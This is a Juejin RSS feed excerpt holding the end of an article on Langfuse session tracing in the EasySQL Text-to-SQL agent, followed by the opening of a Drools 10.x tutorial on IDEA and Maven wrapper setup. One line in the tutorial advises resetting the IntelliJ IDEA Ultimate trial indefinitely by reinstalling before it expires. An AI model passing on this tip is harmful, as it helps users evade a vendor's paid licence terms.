<table><thead><tr><th>场景</th><th>没有 Session</th><th>有 Session</th></tr></thead><tbody><tr><td>查看某用户的完整交互</td><td>需要自己按时间排序、手动关联</td><td>直接点进 Session 看回放</td></tr><tr><td>统计"用户平均几轮完成任务"</td><td>无法统计</td><td>Dashboard 直接提供</td></tr><tr><td>分析"追问时 SQL 质量是否下降"</td><td>需要导出数据写脚本</td><td>按 Session 内的 Trace 顺序直接对比</td></tr><tr><td>定位"用户反馈体验差"的问题</td><td>只能逐条 Trace 查看</td><td>拿到 session_id 直接看全过程</td></tr></tbody></table>
<h3 data-id="heading-8">总结</h3>
<p>session是一个很小的知识点，但是使用的好对我们整个agent开发带来的增益是巨大。</p>
<p>以上所有代码示例均来自我的开源项目 <strong>EasySQL</strong> —— 一个 Text-to-SQL 智能体分析应用，项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzaizaizhao%2Feasysql" target="_blank" title="https://github.com/zaizaizhao/easysql" ref="nofollow noopener noreferrer">github.com/zaizaizhao/…</a>。项目主要技术栈包括：</p>
<ul>
<li><strong>LangGraph</strong>：构建多步骤 Agent 状态机，支持条件路由、Human-in-the-Loop 澄清、SQL 生成→验证→修复的迭代循环</li>
<li><strong>LangChain</strong>：LLM 调用抽象与 RunnableConfig 配置传递</li>
<li><strong>Langfuse</strong>：Callback + 手动 Span 双模式可观测性，实现全链路追踪与业务汇总</li>
<li><strong>PostgreSQL + AsyncPostgresSaver</strong>：LangGraph Checkpointer 状态持久化，支持多轮对话上下文</li>
<li><strong>FastAPI + Uvicorn</strong>：异步 API 服务层，提供流式 SSE 响应</li>
<li><strong>Milvus</strong>：向量数据库，用于 Schema 语义检索</li>
<li><strong>Neo4j</strong>： 图数据库，用于知识图谱构建</li>
<li><strong>Pydantic Settings</strong>：类型安全的配置管理，支持环境变量覆盖</li>
</ul>
<p>项目示例</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64a13c7452a6489eb1a98457a9893b16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgemFpemFpemhhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771558042&amp;x-signature=Isad%2BABbvqYPIB2dxqX9EfW03uo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d40fae962104a7b83d9a475b45348d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgemFpemFpemhhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771558042&amp;x-signature=1IE3mWfiDse08V2zs2U0jjj8Oz0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d89d860902c4a998c9793028a46a62b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgemFpemFpemhhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771558042&amp;x-signature=zYVTbT1aAn2LWsXZsyp6egZu3L4%3D" alt="image.png" loading="lazy"/></p>
<p>欢迎 Star ⭐ 和交流、共建！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[KIE Drools 10.x 规则引擎快速入门]]></title>    <link>https://juejin.cn/post/7605811866908753929</link>    <guid>https://juejin.cn/post/7605811866908753929</guid>    <pubDate>2026-02-13T03:47:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908753929" data-draft-id="7605769126272188462" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="KIE Drools 10.x 规则引擎快速入门"/> <meta itemprop="keywords" content="Java,后端"/> <meta itemprop="datePublished" content="2026-02-13T03:47:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java小卷"/> <meta itemprop="url" content="https://juejin.cn/user/1614502546384749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            KIE Drools 10.x 规则引擎快速入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1614502546384749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java小卷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:47:17.000Z" title="Fri Feb 13 2026 03:47:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h3 data-id="heading-0">前言</h3>
<p>自Drools加入Apache KIE组织下的项目后，其版本研发向着API标准化、生态更完善的方向不断迭代迈进。从原先Drools团队维护的8.44.x版本过渡到Apache KIE自动化智能决策项目集合大家庭产品的研发条线上来，在项目微服务化、部署云原生化的今天，再结合AI项目赋能的大背景，可以说Drools的学习与应用将迎来新的热潮。鉴于国内这方面的书籍、博客等教程依然停留在老版本，也因老版本的限制，生产实践得不够全面、彻底，本人开设了该技术专栏，与广大技术员一起学习探讨新版Drools的全面实践议题，通过分享从0-1的实践步骤与学习感悟，一起撑起国人使用Drools技术提高IT企业生产力的一片天。一起加油！</p>
<h2 data-id="heading-1">Drools版本说明</h2>
<p>Drools在加入Apache KIE组织之前，文档是由Drools研发团队自己维护的，地址为：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.drools.org%2F" target="_blank" title="https://docs.drools.org/" ref="nofollow noopener noreferrer">docs.drools.org/</a>，更新的最后版本为<code>8.44.0.Final</code>。<strong>目前市面上大多教程还是基于drools7的</strong>，而纳入到Apache下的KIE顶级项目后，drools的生态发展变得更全面更完善，文档更规范、API设计也更优雅和健壮，很好的与目前成熟的云原生架构、AI技术体系融合，Drools迎来了脱胎换骨的新发展。相应的Drools文档地址也换了</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83587724703145059485259adb7c6cd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=Qq2TTr4GEzIRuAwK%2BoqrbtmQH0k%3D" alt="20260210120113.png" loading="lazy"/></p>
<h2 data-id="heading-2">环境准备</h2>
<p>可参考drools官方技术文档的<a href="https://link.juejin.cn?target=https%3A%2F%2Fkie.apache.org%2Fdocs%2F10.1.x%2Fdrools%2Fdrools%2Fgetting-started%2Findex.html%23_prerequisites" target="_blank" title="https://kie.apache.org/docs/10.1.x/drools/drools/getting-started/index.html#_prerequisites" ref="nofollow noopener noreferrer">入门-先决条件</a>小节。<strong>只不过咱们这里的实践不依赖官方指南的命令行操作方式，而是高效的使用idea的集成开发环境来构建应用。</strong></p>
<ul>
<li>jdk17+</li>
<li>Apache Maven3.9.6+</li>
<li>开发工具：idea2025.3.2</li>
<li>规则编辑器：vscode插件（idea插件比较有限）</li>
</ul>
<h3 data-id="heading-3">idea下载安装</h3>
<p>点击<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jetbrains.com%2Fidea%2Fdownload" target="_blank" title="https://www.jetbrains.com/idea/download" ref="nofollow noopener noreferrer">idea官方下载地址</a>，选择对应操作系统的版本点下载，</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3e61315d94e4c14be2e22d62cf04032~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=%2FxUAB1t7Mti49OmrafsiMRJuFjs%3D" alt="20260209204411.png" loading="lazy"/>
下载的版本：<em>idea-2025.3.2.exe</em>，双击安装，自行设置安装路径，个人设置为：<code>d:\Programs\JetBrains\IntelliJ IDEA 2025.3.2</code>，<em>安装选项</em>界面，勾选创建桌面快捷方式、添加<em>bin</em>目录到<em>path</em>、添加<em>将文件夹打开为项目</em>，执行后续安装。安装成功，点<em>完成</em>前，勾选<em>运行idea</em>。
第一次运行，默认中文环境（如果弹出该界面的话），点不发送数据共享，跳过导入设置（如果弹出该界面的话）</p>
<h3 data-id="heading-4">创建Java项目</h3>
<p>进入idea环境界面，如果界面为英文，这里咱们统一下，点左下角的<em>设置</em>，进入<em>Language and Region</em>设置（可直接搜索定位设置），语言设置为简体中文，点<em>应用</em>设置，重启idea即可。</p>
<p>在欢迎界面点<em>新建项目</em>，左侧项目类型选<em>Java</em>，右侧的设置</p>
<ul>
<li>名称：<em>rule-java-maven</em></li>
<li>位置：<em>E:\code\drools-projects</em></li>
<li>构建系统：<em>Maven</em></li>
<li>JDK
点<em>下载JDK</em>，弹出框中选择你想要下载的jdk版本，个人设置为：</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a321ba4066546c98a3e3501590374fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=GyINhHGs3QM9VokmLIjLT9iR3DE%3D" alt="20260209212651.png" loading="lazy"/></p>
<ul>
<li>取消<em>添加示例代码</em></li>
<li>高级设置
组名可自己定，个人设置为<code>org.zm626</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9e9d50e82ae472da9ff99eef43021b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=8sJVGJYPhRjzpKhg%2Bnezc5PztHw%3D" alt="20260209213028.png" loading="lazy"/></p>
<p>最后点<em>创建</em></p>
<p>项目自动构建成功</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f96e779cfcb494f9d714e7915497cce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=yzhaJNTbrVQEWRiQVXey3d45j34%3D" alt="20260209213556.png" loading="lazy"/></p>
<h4 data-id="heading-5">开启免费使用idea</h4>
<p>在开发主界面右上角点<em>开始免费试用</em>，会打开idea Ultimate版本的订阅页面，点<em>开始免费试用</em>，即可激活各种插件，默认有30天的使用期。对于不想付费的同学，可以在到期前导出idea设置，到期后卸载重装并导入设置，可无限循环使用。</p>
<h4 data-id="heading-6">jdk设置</h4>
<p>安装咱们创建向导所选择的jdk版本，实现了自动下载安装。
点主界面右上角的<em>齿轮图标 | 项目结构 | 项目设置</em>，查看项目使用的jdk，<em>语言级别</em>保持默认的jdk。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d6bccc48f41486bb0eed78ead34ea6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=BiMjGZdm%2BgLVhxlC8pacLwqd%2BW4%3D" alt="20260209214942.png" loading="lazy"/>
如果需要其他版本的jdk，可在本界面，点<em>平台设置 | SDK</em>，来全局维护jdk版本，并回到<em>项目设置 | 项目 | SDK</em>，选择切换jdk版本。</p>
<h4 data-id="heading-7">maven设置</h4>
<p>打开idea设置，搜索<em>Maven</em>，查看<em>Maven主路径</em>设置，默认为idea捆绑的maven版本，这里可切换为<em>使用Maven包装器</em>，而maven的本地仓库路径和设置默认在用户目录下，保持该设置，</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75002a7b565940099958c5cc1f1a6c58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=KGoeiRHvzEqkGmfmbZ%2FMpzG0KQc%3D" alt="20260209223347.png" loading="lazy"/>
点<em>确定</em>，回到主界面，会看到右下角的警告：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5705f3270bb4f3082b31c045fba6ab3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=VacAVwTziEeC7ClaKFvJXcfD89I%3D" alt="20260209220021.png" loading="lazy"/>
在工程的 <em>.mvn</em> 目录下新增目录和文件：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10f09901e33247bcbac434cddad6067c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=7ndmvf%2FthrJ2YC5vJ%2B%2BJQGyfbO0%3D" alt="20260209220142.png" loading="lazy"/>
文件内容如下：</p>
<pre><code class="hljs language-properties" lang="properties">wrapperVersion=3.3.4  
distributionType=only-script  
distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.9.6/apache-maven-3.9.6-bin.zip
</code></pre>
<p>完成编辑后，点右边悬浮的<em>同步Maven更改</em>的小图标，这只是完成Maven配置同步，要重新加载整个maven项目，点Maven工具栏第一个刷新图标，点下拉的第二个选项：<em>重新加载所有的Maven项目</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6654158d2ff4cb2a8055be121288e49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=HZ8ee4IOIOcLaTopxVvLE8zH9HE%3D" alt="20260209220900.png" loading="lazy"/>
完成构建后，这种Maven包装器方式会在本地用户路径下自行安装以上配置文件中指定的maven版本，这种wrapper随同工程源码分发的方式，有助于研发团队或者学习小组成员之间协同。看到本地解压的maven软件包：</p>
